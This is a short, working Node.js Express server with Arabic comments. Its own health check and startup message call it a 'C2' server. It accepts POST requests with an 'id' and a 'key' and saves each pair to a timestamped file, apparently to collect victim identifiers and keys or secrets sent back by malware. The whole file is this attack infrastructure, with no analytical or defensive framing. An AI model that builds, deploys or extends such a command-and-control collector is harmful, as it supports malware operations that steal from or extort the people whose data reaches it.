import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import helmet from 'helmet';
import morgan from 'morgan';

// __dirname for ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const PORT = process.env.PORT || 3000;
const REPORTS_DIR = path.join(__dirname, 'reports');

// تأكد من وجود المجلد أو أنشئه إذا لم يكن موجودًا
if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR);

app.use(helmet()); // حماية إضافية
app.use(express.json()); // لتحليل طلبات JSON
app.use(morgan('combined')); // لتسجيل الأنشطة

// نقطة النهاية لإنشاء التقرير
app.post('/report', (req, res) => {
  const { id, key } = req.body;

  // تحقق من وجود id و key
  if (!id || !key) return res.status(400).json({ error: 'Missing id or key' });

  const ts = Date.now(); // الوقت الحالي
  const safeId = id.replace(/[^\w-]/g, '_'); // استبدال الحروف غير الصالحة بـ '_'
  const filename = `${ts}_${safeId}.txt`; // اسم الملف باستخدام الطابع الزمني و id

  try {
    // كتابة التقرير في الملف
    fs.writeFileSync(path.join(REPORTS_DIR, filename), 
      `ID: ${id}\nKEY: ${key}\nTS: ${new Date(ts).toISOString()}\n`);
    console.log(`Saved ${filename}`);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('Error writing file:', err);
    res.status(500).json({ error: 'Failed to save report' });
  }
});

// نقطة النهاية لفحص حالة السيرفر
app.get('/healthz', (req, res) => res.send('C2 up'));

// الاستماع على المنفذ المحدد
app.listen(PORT, () => console.log(`C2 listening on ${PORT}`));
